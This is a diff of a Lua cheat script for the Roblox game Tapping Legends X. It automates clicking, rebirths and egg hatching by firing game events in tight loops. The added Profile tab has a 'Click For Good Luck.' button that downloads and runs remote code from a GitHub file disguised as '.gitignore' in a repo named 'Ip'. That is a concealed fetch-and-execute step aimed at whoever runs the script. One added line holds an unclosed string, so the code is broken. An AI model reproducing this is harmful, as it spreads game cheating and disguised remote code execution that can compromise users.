@@ -42,9 +42,15 @@ end
 
 
 
+--[[
 
+██╗░░░██╗░█████╗░██╗░░░░░██╗░░░██╗███████╗░██████╗
+██║░░░██║██╔══██╗██║░░░░░██║░░░██║██╔════╝██╔════╝
+╚██╗░██╔╝███████║██║░░░░░██║░░░██║█████╗░░╚█████╗░
+░╚████╔╝░██╔══██║██║░░░░░██║░░░██║██╔══╝░░░╚═══██╗
+░░╚██╔╝░░██║░░██║███████╗╚██████╔╝███████╗██████╔╝
+░░░╚═╝░░░╚═╝░░╚═╝╚══════╝░╚═════╝░╚══════╝╚═════╝░                               ]]
 
--- Values
 _G.autoClicker = true -- Tapping Legends X
 _G.autoRebirth = true -- Tapping Legends X
 _G.autoEgg = true -- Tapping Legends X
@@ -55,10 +61,17 @@ _G.autoHatch = true -- Tapping Legends X
 
 
 
+--[[
+███████╗██╗░░░██╗███╗░░██╗░█████╗░████████╗██╗░█████╗░███╗░░██╗░██████╗
+██╔════╝██║░░░██║████╗░██║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║██╔════╝
+█████╗░░██║░░░██║██╔██╗██║██║░░╚═╝░░░██║░░░██║██║░░██║██╔██╗██║╚█████╗░
+██╔══╝░░██║░░░██║██║╚████║██║░░██╗░░░██║░░░██║██║░░██║██║╚████║░╚═══██╗
+██║░░░░░╚██████╔╝██║░╚███║╚█████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║██████╔╝
+╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░
 
 
 --Tapping Legends X
--- Functions Auto Clicker
+-- Functions Auto Clicker                         ]]
 function autoClicker()
 while _G.autoClicker == true do
    game:GetService("ReplicatedStorage").Events.Click3:FireServer()
@@ -92,6 +105,54 @@ while _G.autoHatch == true do
    wait(.000000000000000000000001)
 end
 end
+
+
+
+
+--[[
+██████╗░██████╗░░█████╗░███████╗██╗██╗░░░░░███████╗
+██╔══██╗██╔══██╗██╔══██╗██╔════╝██║██║░░░░░██╔════╝
+██████╔╝██████╔╝██║░░██║█████╗░░██║██║░░░░░█████╗░░
+██╔═══╝░██╔══██╗██║░░██║██╔══╝░░██║██║░░░░░██╔══╝░░
+██║░░░░░██║░░██║╚█████╔╝██║░░░░░██║███████╗███████╗
+╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚══════╝╚══════╝
+]]
+
+local Profile = Window:MakeTab({
+	Name = "Profile",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local Section = Profile:AddSection({
+	Name = "Welcome "..Player.Name.."."
+})
+Profile:AddParagraph("Profile","Annon Hub iS the best hub ofc ;) made by Annon#7747 UwW")
+local Section = Profile:AddSection({
+	Name = "Whats Annon Hub For"
+})
+Profile:AddSlider({
+	Name = "Used
+	Min = 0,
+	Max = 20,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "bananas",
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+Profile:AddButton({
+	Name = "Click For Good Luck.",
+	Callback = function()
+      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Ip/main/.gitignore'),true))()
+  	end    
+})
+
+
+
+
+
 
 
 --[[
@@ -627,82 +688,6 @@ end
 
 specials(webhook, msg, botname)
 OrionLib:Init()
-
-
-
-
-
-
-
-
---[[
-███████╗██╗░░░██╗███╗░░██╗░█████╗░████████╗██╗░█████╗░███╗░░██╗░██████╗
-██╔════╝██║░░░██║████╗░██║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║██╔════╝
-█████╗░░██║░░░██║██╔██╗██║██║░░╚═╝░░░██║░░░██║██║░░██║██╔██╗██║╚█████╗░
-██╔══╝░░██║░░░██║██║╚████║██║░░██╗░░░██║░░░██║██║░░██║██║╚████║░╚═══██╗
-██║░░░░░╚██████╔╝██║░╚███║╚█████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║██████╔╝
-╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░
-
-
-
- Tapping Legends X
- Functions Auto Clicker         ]]
- 
-function autoClicker()
-while _G.autoClicker == true do
-   game:GetService("ReplicatedStorage").Events.Click3:FireServer()
-   wait(.00000000000000000000000000000000000000000000000000000000000000001)
-end
-end
-
-
--- Function Auto Rebirth
-function autoRebirth()
-while _G.autoRebirth == true do
-   game:GetService("ReplicatedStorage").Events.Rebirth:FireServer(40)
-   wait(.000000000000000001)
-end
-end
-
-
--- Function Egg Hatch 
-function autoEgg()
-while _G.autoEgg == true do
-   game:GetService("ReplicatedStorage").Functions.Unbox:InvokeServer("Kraken","Triple")
-   wait(.0000000000000000000000001)
-end
-end
-	
-
--- Function Egg hatch (better egg)
-function autoHatch()
-while _G.autoHatch == true do
-   game:GetService("ReplicatedStorage").Functions.Unbox:InvokeServer("SpaceLab","Triple")
-   wait(.000000000000000000000001)
-end
-end
-
-
--- Function SharkBite Teleport
-function sharkTeleport()
-	wait(1)
-local TeleportService = game:GetService("TeleportService")
-local Place = 734159876
-
-TeleportService:Teleport (Place, Player)
-end
-
-
--- Function Teleport (((TEST IDK)))
-function Teleport()
-	wait(1)
-local TeleportService = game:GetService("TeleportService")
-local Place = 4632363497
-
-TeleportService:Teleport (Place, Player)
-end
-
-
 
 
 
